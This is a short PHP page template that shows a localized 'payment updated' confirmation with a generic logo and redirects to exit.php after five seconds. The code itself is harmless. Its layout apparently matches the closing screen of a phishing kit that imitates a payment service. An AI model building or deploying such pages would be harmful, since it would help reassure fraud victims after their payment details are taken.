<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>    
<main>
    <div class="form" style="text-align:center;">
        <div class="logo"><img src="res/logo.png"></div>
        <div class="text">
            <h2 style="margin-bottom:30px;"><?php echo $lang['_payment_updated_title']; ?></h2>
            <span><?php echo $lang['_payment_updated_message']; ?></span>
        </div>

        <div class="col"></div>

        <div class="col" style="text-align:center;"></div>
    </div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setTimeout(() => {
    window.location="exit.php";
}, 5000);
 

</script>
</body>
</html>